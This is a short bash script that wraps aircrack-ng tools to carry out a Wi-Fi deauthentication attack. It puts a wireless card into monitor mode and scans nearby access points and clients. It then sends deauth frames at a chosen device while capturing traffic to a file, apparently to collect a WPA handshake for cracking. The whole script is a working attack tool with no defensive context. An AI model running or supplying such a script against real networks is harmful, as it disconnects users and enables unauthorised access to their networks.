#!/bin/bash


iwconfig

##Choise using awk ???

read -p "Enter Wireless Interface Name: " wint

#Put interface into mon mode

airmon-ng start $wint
read -p "End of start"
wintmon="${wint}mon"

##output whats in the area... wireless device and cient
airodump-ng $wintmon
read -p "End of Dump"


read -p "Enter channel number: " chnum
read -p "Enter BSSID MAC: " bssidmac
read -p "Enter Device MAC: " devicemac
read -p "File location and name: " file

##start packet cap
aireplay-ng $wintmon --deauth 3 -a $bssidmac -c $devicemac -D & airodump-ng $wintmon --bssid  $bssidmac -w $file $wintmon

##iwconfig $wintmon channel $chnum
##aireplay-ng $wintmon --deauth 3 -a $bssidmac -c $devicemac -D

read -p "Enter to Exit"

##take interface out off mon mode
airmon-ng stop $wintmon